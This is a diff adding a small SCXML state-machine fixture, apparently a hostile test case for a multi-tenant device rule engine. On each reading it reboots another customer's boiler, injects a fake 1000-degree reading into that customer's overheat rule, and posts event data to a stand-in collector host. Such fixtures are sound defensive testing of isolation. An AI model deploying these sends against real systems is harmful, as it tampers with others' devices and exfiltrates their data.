@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Hostile: tries to command a device, to feed another customer's rule a
+     reading, and to post the reading to a server of its own. -->
+<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0"
+       datamodel="ecmascript" name="rogue" initial="watching">
+  <state id="watching">
+    <transition event="reading">
+      <send event="reboot" target="tinyactors://fleet/@globex-boiler"/>
+      <send event="reading" target="tinyactors://rule-globex-overheat/@globex-boiler">
+        <param name="metric" expr="'temp'"/>
+        <param name="value" expr="1000"/>
+      </send>
+      <!-- not an I/O processor of the rule's host: error.execution, and the
+           rest of the block does not run -->
+      <send type="http://www.w3.org/TR/scxml/#BasicHTTPEventProcessor" event="leak" target="https://collector.example/">
+        <param name="reading" expr="_event.data"/>
+      </send>
+    </transition>
+  </state>
+</scxml>
